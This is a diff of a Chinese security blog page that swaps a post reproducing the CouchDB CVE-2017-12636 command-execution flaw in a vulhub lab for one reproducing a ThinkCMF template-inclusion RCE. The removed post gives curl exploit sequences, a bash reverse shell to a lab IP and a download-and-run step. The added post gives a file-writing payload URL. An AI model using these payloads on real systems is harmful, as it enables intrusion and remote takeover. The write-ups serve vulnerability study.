@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>CVE-2017-12636 recurrent | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="CVE-2017-12636 recurrent | 九世的博客">
+  <title>ThinkCMF任意包含漏洞复现 | 九世的博客</title>
+  <meta name="keywords" content=" 代码审计 ">
+  <meta name="description" content="ThinkCMF任意包含漏洞复现 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1588,9 +1588,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-CVE-2017-12636-recurrent" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-ThinkCMF任意包含漏洞复现" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">CVE-2017-12636 recurrent</h1>
+        <h1 class="article-title">ThinkCMF任意包含漏洞复现</h1>
     
     <div class="article-meta">
         
@@ -1599,14 +1599,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">代码审计</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-02-09 15:17</time>
+        创建时间:<time class="date" title="更新时间: 2021-01-09 15:42:10">2021-01-09 15:34</time>
         
     </div>
     <div class="article-meta">
@@ -1628,7 +1628,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞介绍"><span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现过程"><span class="toc-text">复现过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-text">getshell</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因"><span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞危害"><span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#影响版本"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现过程"><span class="toc-text">复现过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1643,44 +1643,113 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr>
-<p>继续复现CVE，这次是CVE-2017-12636<br><img src="http://n.sinaimg.cn/front/400/w1280h720/20190110/t1hw-hrkkweh6498780.jpg" alt="t1hw-hrkkweh6498780.jpg"></p>
-<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><hr>
-<p>CVE-2017-12636漏洞在于CouchDB自身的设计问题，CouchDB在query_server中引入了外部的二进制程序来执行命令，我们可以通过CouchDB自身提供的Restful API接口动态修改保存配置，从而执行系统命令<br>这里我只复现1.6版本的</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><hr>
-<p>下载vulhub，进入对应CVE文件夹，执行：</p>
-<pre><code>docker-compose up -d
-</code></pre><p>搭建成功后访问，能看到如下图所示</p>
-<pre><code>http://127.0.0.1:5983
-</code></pre><p><img src="https://s2.ax1x.com/2019/02/09/kNqK4s.png" alt="kNqK4s.png"></p>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><hr>
-<p>利用要求：需要拥有一个管理员账号<br>使用CVE-2017-12635来添加一个账号<br><img src="https://s2.ax1x.com/2019/02/09/kNq1g0.png" alt="kNq1g0.png"></p>
-<pre><code>username:vulhub
-password:vulhub
-</code></pre><p>依次执行以下命令则可命令执行：</p>
-<pre><code>curl -X PUT &#39;http://vulhub:vulhub@192.168.190.128:5984/_config/query_servers/cmd&#39; -d &#39;&quot;id &gt;/tmp/success&quot;&#39;
-curl -X PUT &#39;http://vulhub:vulhub@192.168.190.128:5984/vultest&#39;
-curl -X PUT &#39;http://vulhub:vulhub@192.168.190.128:5984/vultest/vul&#39; -d &#39;{&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;}&#39;
-curl -X POST &#39;http://vulhub:vulhub@192.168.190.128:5984/vultest/_temp_view?limit=10&#39; -d &#39;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&#39; -H &#39;Content-Type:application/json&#39;
-</code></pre><p>结果如下：<br><img src="https://s2.ax1x.com/2019/02/09/kNqNE4.png" alt="kNqNE4.png"></p>
-<p><img src="https://s2.ax1x.com/2019/02/09/kNqDv6.png" alt="kNqDv6.png"></p>
-<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><hr>
-<p>操作如下：</p>
-<pre><code>1.先用nc在kali监听nc -lvp 9999
-2.用python -m SimpleHttpsServer 8083在kali搭建一个简单的http服务
-3.在根目录创建一个index.html写入bash -i &gt;&amp; /dev/tcp/192.168.241.128/9000 0&gt;&amp;1
-4.执行以下命令即可获得一个shell
-</code></pre><p>命令如下：</p>
-<pre><code>curl -X PUT http://vulhub:vulhub@192.168.241.128:5984/_node/nonode@nohost/_config/query_servers/cmd -d &#39;&quot;curl 192.168.241.128:8083/ -o /tmp/bashshell&quot;&#39;
-curl -X POST &#39;http://vulhub:vulhub@192.168.241.128:5984/vultest/_temp_view?limit=10&#39; -d &#39;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&#39; -H &#39;Content-Type:application/json&#39;
-curl -X PUT http://vulhub:vulhub@192.168.241.128:5984/_node/nonode@nohost/_config/query_servers/cmd -d &#39;&quot;bash /tmp/bashshell&quot;&#39;
-curl -X POST &#39;http://vulhub:vulhub@192.168.241.128:5984/vultest/_temp_view?limit=10&#39; -d &#39;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&#39; -H &#39;Content-Type:application/json&#39;
-</code></pre><p>我这里将命令扔进demo.sh</p>
-<p><img src="https://s2.ax1x.com/2019/02/09/kNq2UH.png" alt="kNq2UH.png"></p>
-<p><img src="https://s2.ax1x.com/2019/02/09/kNqbVg.md.png" alt="kNqbVg.md.png"></p>
-<p><img src="https://s2.ax1x.com/2019/02/09/kNqL5j.md.png" alt="kNqL5j.md.png"></p>
-<p><img src="https://s2.ax1x.com/2019/02/09/kNLSMV.png" alt="kNLSMV.png"></p>
-<p>转载请声明：转自422926799.github.io</p>
+        <h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>根据ThinkPHP框架约定可以通过a参数来指定对应的函数名，但是该函数的修饰符必须为Public, 而添加的代码正好符合该条件。 可以通过如下URL进行访问，并且可以添加GET参数arg1传递给函数。</p>
+<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>远程攻击者在无需任何权限情况下，通过构造特定的请求包即可在远程服务器上执行任意代码。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>ThinkCMF X1.6.0<br>ThinkCMF X2.1.0<br>ThinkCMF X2.2.0<br>ThinkCMF X2.2.1<br>ThinkCMF X2.2.2</p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞出在：application\Portal\Controller\IndexController.class.php<br>首先引用Common\Controller\HomebaseController控制类文件，然后调用display函数<br><img src="https://s3.ax1x.com/2021/01/09/sMq958.png" alt=""></p>
+<p>跟入display函数看描述就是可以自定义加载模版，通过$this-&gt;parseTemplate 函数根据约定确定模版路径，如果不符合原先的约定将会从当前目录开始匹配。<br><img src="https://s3.ax1x.com/2021/01/09/sMqZbq.png" alt=""></p>
+<pre><code class="php">public function parseTemplate($template=&#39;&#39;) {
+
+   $tmpl_path=C(&quot;SP_TMPL_PATH&quot;); // 前台模板文件根目录 themes/
+   define(&quot;SP_TMPL_PATH&quot;, $tmpl_path);
+   if($this-&gt;theme) { // 指定模板主题
+       $theme = $this-&gt;theme;
+   }else{
+       // 获取当前主题名称
+       $theme      =    C(&#39;SP_DEFAULT_THEME&#39;); // 前台模板文件 simplebootx
+       if(C(&#39;TMPL_DETECT_THEME&#39;)) {// 自动侦测模板主题
+           $t = C(&#39;VAR_TEMPLATE&#39;); //默认模板切换变量 t
+           if (isset($_GET[$t])){
+               $theme = $_GET[$t];
+           }elseif(cookie(&#39;think_template&#39;)){
+               $theme = cookie(&#39;think_template&#39;);
+           }
+           if(!file_exists($tmpl_path.&quot;/&quot;.$theme)){ //判断前台模板文件是否存在
+               $theme  =   C(&#39;SP_DEFAULT_THEME&#39;);
+           }
+           cookie(&#39;think_template&#39;,$theme,864000);
+       }
+   }
+
+   $theme_suffix=&quot;&quot;;
+
+   if(C(&#39;MOBILE_TPL_ENABLED&#39;) &amp;&amp; sp_is_mobile()){//开启手机模板支持
+
+       if (C(&#39;LANG_SWITCH_ON&#39;,null,false)){
+           if(file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_mobile_&quot;.LANG_SET)){//优先级最高
+               $theme_suffix  =  &quot;_mobile_&quot;.LANG_SET;
+           }elseif (file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_mobile&quot;)){
+               $theme_suffix  =  &quot;_mobile&quot;;
+           }elseif (file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_&quot;.LANG_SET)){
+               $theme_suffix  =  &quot;_&quot;.LANG_SET;
+           }
+       }else{
+              if(file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_mobile&quot;)){
+                  $theme_suffix  =  &quot;_mobile&quot;;
+              }
+       }
+   }else{
+       $lang_suffix=&quot;_&quot;.LANG_SET;
+       if (C(&#39;LANG_SWITCH_ON&#39;,null,false) &amp;&amp; file_exists($tmpl_path.&quot;/&quot;.$theme.$lang_suffix)){
+           $theme_suffix = $lang_suffix;
+       }
+   }
+
+   $theme=$theme.$theme_suffix; //定义当前语言
+
+   C(&#39;SP_DEFAULT_THEME&#39;,$theme);
+
+   $current_tmpl_path=$tmpl_path.$theme.&quot;/&quot;;
+   // 获取当前主题的模版路径
+   define(&#39;THEME_PATH&#39;, $current_tmpl_path);
+
+   $cdn_settings=sp_get_option(&#39;cdn_settings&#39;);
+   if(!empty($cdn_settings[&#39;cdn_static_root&#39;])){
+       $cdn_static_root=rtrim($cdn_settings[&#39;cdn_static_root&#39;],&#39;/&#39;);
+       C(&quot;TMPL_PARSE_STRING.__TMPL__&quot;,$cdn_static_root.&quot;/&quot;.$current_tmpl_path);
+       C(&quot;TMPL_PARSE_STRING.__PUBLIC__&quot;,$cdn_static_root.&quot;/public&quot;);
+       C(&quot;TMPL_PARSE_STRING.__WEB_ROOT__&quot;,$cdn_static_root);
+   }else{
+       C(&quot;TMPL_PARSE_STRING.__TMPL__&quot;,__ROOT__.&quot;/&quot;.$current_tmpl_path);
+   }
+
+
+   C(&#39;SP_VIEW_PATH&#39;,$tmpl_path);
+   C(&#39;DEFAULT_THEME&#39;,$theme);
+
+   define(&quot;SP_CURRENT_THEME&quot;, $theme);
+
+   if(is_file($template)) {
+      return $template;
+   }
+   $depr       =   C(&#39;TMPL_FILE_DEPR&#39;);
+   $template   =   str_replace(&#39;:&#39;, $depr, $template);
+
+   // 获取当前模块
+   $module   =  MODULE_NAME;
+   if(strpos($template,&#39;@&#39;)){ // 跨模块调用模版文件
+      list($module,$template)  =   explode(&#39;@&#39;,$template);
+   }
+
+   $module =$module.&quot;/&quot;;
+
+   // 分析模板文件规则
+   if(&#39;&#39; == $template) {
+      // 如果模板文件名为空 按照默认规则定位
+      $template = CONTROLLER_NAME . $depr . ACTION_NAME;
+   }elseif(false === strpos($template, &#39;/&#39;)){
+      $template = CONTROLLER_NAME . $depr . $template;
+   }
+
+   $file = sp_add_template_file_suffix($current_tmpl_path.$module.$template);
+   $file= str_replace(&quot;//&quot;,&#39;/&#39;,$file);
+   if(!file_exists_case($file)) E(L(&#39;_TEMPLATE_NOT_EXIST_&#39;).&#39;:&#39;.$file);
+   return $file;
+}
+</code></pre>
+<p>由于parseTemplate函数为模板渲染函数，而该函数权限为public。导致可控，最终payload如下：<br>/?a=fetch&amp;templateFile=public/index&amp;prefix=’’&amp;content=<php>file_put_contents(‘test.php’,’&lt;?php phpinfo(); ?&gt;’)</php><br><img src="https://s3.ax1x.com/2021/01/09/sMqMPU.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2021/01/09/sMq8M9.png" alt=""></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/ch459742906/p/5949168.html" target="_blank" rel="noopener">https://www.cnblogs.com/ch459742906/p/5949168.html</a><br><a href="https://mp.weixin.qq.com/s/3d7YrTq0vFSKXV6u0Hjnnw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3d7YrTq0vFSKXV6u0Hjnnw</a><br><a href="https://www.cnblogs.com/0daybug/p/11720575.html" target="_blank" rel="noopener">https://www.cnblogs.com/0daybug/p/11720575.html</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1690,12 +1759,12 @@ curl -X POST &#39;http://vulhub:vulhub@192.168.241.128:5984/vultest/_temp_view?l
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>CVE-2017-12636 recurrent</p>
+    <p><span class="copy-title">文章标题:</span>ThinkCMF任意包含漏洞复现</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-02-09, 15:17:57</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/67b377fa.html" title="CVE-2017-12636 recurrent">http://422926799.github.io/posts/67b377fa.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-01-09, 15:34:49</p>
+    <p><span class="copy-title">最后更新:</span>2021-01-09, 15:42:10</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/3656eb8c.html" title="ThinkCMF任意包含漏洞复现">http://422926799.github.io/posts/3656eb8c.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
